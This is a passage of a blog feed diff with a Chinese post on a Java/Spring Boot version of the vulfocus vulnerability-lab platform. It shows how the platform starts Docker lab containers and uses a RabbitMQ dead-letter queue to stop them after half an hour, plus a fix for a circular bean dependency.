+        data.put(<span class="hljs-string">&quot;host&quot;</span>, vulHost);
+        data.put(<span class="hljs-string">&quot;port&quot;</span>, vulPort);
+        data.put(<span class="hljs-string">&quot;id&quot;</span>, containerId);
+        data.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;running&quot;</span>);
+        data.put(<span class="hljs-string">&quot;start_data&quot;</span>, taskStartDate.toInstant(ZoneOffset.ofHours(<span class="hljs-number">8</span>)).toEpochMilli());
+        data.put(<span class="hljs-string">&quot;end_data&quot;</span>, taskEndDate != <span class="hljs-keyword">null</span> ? taskEndDate.toInstant(ZoneOffset.ofHours(<span class="hljs-number">8</span>)).toEpochMilli() : <span class="hljs-number">0</span>);
+        LambdaQueryWrapper&lt;TaskInfo&gt; wrapper = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();
+        wrapper.eq(<span class="hljs-keyword">true</span>, TaskInfo::getUserId, userId);
+        wrapper.eq(<span class="hljs-keyword">true</span>, TaskInfo::getTaskMsg, JSON.toJSONString(data));
+        wrapper.eq(<span class="hljs-keyword">true</span>, TaskInfo::getOperationType, <span class="hljs-number">2</span>);
+        wrapper.eq(<span class="hljs-keyword">true</span>, TaskInfo::getOperationArgs, JSON.toJSONString(args));
+        wrapper.eq(<span class="hljs-keyword">true</span>, TaskInfo::getTaskEndDate, taskEndDate);
+        wrapper.eq(<span class="hljs-keyword">true</span>, TaskInfo::getTaskName, <span class="hljs-string">&quot;运行容器：&quot;</span> + imageName);
+        TaskInfo searchTaskInfo = getOne(wrapper);
+        <span class="hljs-keyword">if</span> (searchTaskInfo == <span class="hljs-keyword">null</span>) &#123;
+            taskInfo.setTaskId(taskId);
+            taskInfo.setTaskStatus(<span class="hljs-number">3</span>);
+            taskInfo.setTaskMsg(JSON.toJSONString(data));
+            taskInfo.setOperationArgs(JSON.toJSONString(args));
+            taskInfo.setUpdateDate(LocalDateTime.now());
+            taskId = taskInfo.getTaskId();
+            LambdaQueryWrapper&lt;TaskInfo&gt; updateWrapperTask = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();
+            updateWrapperTask.eq(<span class="hljs-keyword">true</span>, TaskInfo::getTaskId, taskId);
+            update(taskInfo, updateWrapperTask);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            LambdaQueryWrapper&lt;TaskInfo&gt; removeWapper = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();
+            removeWapper.eq(<span class="hljs-keyword">true</span>, TaskInfo::getTaskId, taskId);
+            remove(removeWapper);
+            searchTaskInfo.setTaskId(taskId);
+            searchTaskInfo.setUpdateDate(LocalDateTime.now());
+            searchTaskInfo.setTaskStatus(<span class="hljs-number">3</span>);
+            save(searchTaskInfo);
+        &#125;
+
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        DockerTools.startContainer(dockerContainerId);
+        <span class="hljs-comment">// 写入flag</span>
+        msg = dockerContainerRun(container, command);
+        <span class="hljs-keyword">if</span> (msg != <span class="hljs-keyword">null</span> &amp;&amp; msg.getStatus() == SystemConstants.HTTP_ERROR) &#123;
+            <span class="hljs-keyword">try</span> &#123;
+                DockerTools.deleteContainer(container.getId());
+            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;
+                log.info(<span class="hljs-string">&quot;删除容器失败！&quot;</span>);
+            &#125;
+            taskInfo.setTaskStatus(<span class="hljs-number">4</span>);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            HashMap&lt;String, Object&gt; data = (HashMap&lt;String, Object&gt;) msg.getData();
+            String status = (String) data.get(<span class="hljs-string">&quot;status&quot;</span>);
+            data.put(<span class="hljs-string">&quot;host&quot;</span>, vulHost);
+            data.put(<span class="hljs-string">&quot;port&quot;</span>, vulPort);
+            data.put(<span class="hljs-string">&quot;id&quot;</span>, containerId);
+            data.put(<span class="hljs-string">&quot;start_data&quot;</span>, taskStartDate.toInstant(ZoneOffset.ofHours(<span class="hljs-number">8</span>)).toEpochMilli());
+            data.put(<span class="hljs-string">&quot;end_data&quot;</span>, taskEndDate != <span class="hljs-keyword">null</span> ? taskEndDate.toInstant(ZoneOffset.ofHours(<span class="hljs-number">8</span>)).toEpochMilli() : <span class="hljs-number">0</span>);
+
+            containerVul.setContainerStatus(status);
+            containerVul.setDockerContainerId(dockerContainerId);
+            containerVul.setVulHost(vulHost);
+            containerVul.setVulPort(vulPort);
+            containerVul.setContainerFlag(vulFlag);
+            containerVul.setContainerPort(containerPort);
+            containerVul.setCreateDate(LocalDateTime.now());
+            containerVul.setUserId(userId);
+            containerVul.setIScheck(<span class="hljs-keyword">false</span>);
+            LambdaQueryWrapper&lt;ContainerVul&gt; updateWrapper = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();
+            updateWrapper.eq(<span class="hljs-keyword">true</span>, ContainerVul::getContainerId, containerVul.getContainerId());
+            containerService.update(containerVul, updateWrapper);
+
+            taskInfo.setTaskStartDate(LocalDateTime.now());
+            taskInfo.setTaskEndDate(LocalDateTime.now());
+            taskInfo.setTaskStatus(<span class="hljs-number">3</span>);
+        &#125;
+
+        taskInfo.setTaskMsg(JSON.toJSONString(msg));
+        taskInfo.setUpdateDate(LocalDateTime.now());
+
+        LambdaQueryWrapper&lt;TaskInfo&gt; updateWrapperTask = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();
+        updateWrapperTask.eq(<span class="hljs-keyword">true</span>, TaskInfo::getTaskId, taskId);
+        update(taskInfo, updateWrapperTask);
+    &#125;
+    log.info(<span class="hljs-string">&quot;启动漏洞容器成功，任务ID：&quot;</span> + taskId);
+    <span class="hljs-comment">// 创建关闭容器任务 半小时后关闭</span>
+    String stopContainerTaskId = createStopContainerTask(containerVul, user);
+    <span class="hljs-comment">// 发送到RabbitMQ的死信队列</span>
+    log.info(<span class="hljs-string">&quot;向死信队列发送任务id&quot;</span>);
+    amqpTemplate.convertAndSend(RabbitConstants.DLX_EXCHANGE,
+                                RabbitConstants.DLX_ROUTING_KEY,
+                                stopContainerTaskId);
+&#125;</code></pre>
+
+<p>重点代码就是，就很简单。</p>
+<pre><code class="hljs java"><span class="hljs-comment">// 发送到RabbitMQ的死信队列</span>
+log.info(<span class="hljs-string">&quot;向死信队列发送任务id&quot;</span>);
+amqpTemplate.convertAndSend(RabbitConstants.DLX_EXCHANGE,
+                            RabbitConstants.DLX_ROUTING_KEY,
+                            stopContainerTaskId);</code></pre>
+
+<h3 id="3-2-关闭容器"><a href="#3-2-关闭容器" class="headerlink" title="3.2 关闭容器"></a>3.2 关闭容器</h3><p>在consumer的监听器中执行关闭容器的步骤</p>
+<pre><code class="hljs java"><span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;
+<span class="hljs-keyword">import</span> com.sunzy.vulfocus.common.RabbitConstants;
+<span class="hljs-keyword">import</span> com.sunzy.vulfocus.service.impl.TaskInfoServiceImpl;
+<span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;
+<span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;
+<span class="hljs-keyword">import</span> org.springframework.context.annotation.Lazy;
+<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
+
+<span class="hljs-keyword">import</span> javax.annotation.Resource;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.time.LocalDateTime;
+
+<span class="hljs-meta">@Component</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StopContainerListener</span> </span>&#123;
+
+    <span class="hljs-meta">@Resource</span>
+    <span class="hljs-meta">@Lazy</span> <span class="hljs-comment">// 加这个注释，是因为在启动时，出现了Bean循环依赖的错误</span>
+    <span class="hljs-keyword">private</span> TaskInfoServiceImpl taskInfoService;
+
+    <span class="hljs-meta">@RabbitListener(queues = RabbitConstants.QUEUE, ackMode = &quot;MANUAL&quot;)</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getMessage</span><span class="hljs-params">(Message message, Channel channel)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;
+        System.out.println(<span class="hljs-string">&quot;接收死信队列传递的消息...&quot;</span>);
+        System.out.println(<span class="hljs-string">&quot;时间：&quot;</span> + LocalDateTime.now());
+        String taskId = <span class="hljs-keyword">new</span> String(message.getBody());
+        System.out.println(taskId);
+        <span class="hljs-comment">//</span>
+        taskInfoService.stopContainer(taskId);
+        channel.basicAck(message.getMessageProperties().getDeliveryTag(), <span class="hljs-keyword">false</span>);
+    &#125;
+&#125;
+</code></pre>
+
+<p>一开始启动时出现报错，类似如下信息，增加<code>@Lazy</code>解决Bean循环依赖的错误</p>
+<pre><code class="hljs java">org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name <span class="hljs-string">&#x27;AService&#x27;</span>: Bean with name <span class="hljs-string">&#x27;AService&#x27;</span> has been injected into other beans [BService] in its raw version as part of a circular reference, but has eventually been wrapped. This means that said other beans <span class="hljs-keyword">do</span> not use the <span class="hljs-keyword">final</span> version of the bean. This is often the result of over-eager type matching - consider using <span class="hljs-string">&#x27;getBeanNamesForType&#x27;</span> with the <span class="hljs-string">&#x27;allowEagerInit&#x27;</span> flag turned off, <span class="hljs-keyword">for</span> example.</code></pre>
+
+<p>完整代码在<a href="https://github.com/sunzhengyu99/vulfocus">vulfocus_java</a></p>
+]]></content>
+      <tags>
+        <tag>springboot, rabbitmq</tag>
       </tags>
   </entry>
   <entry>
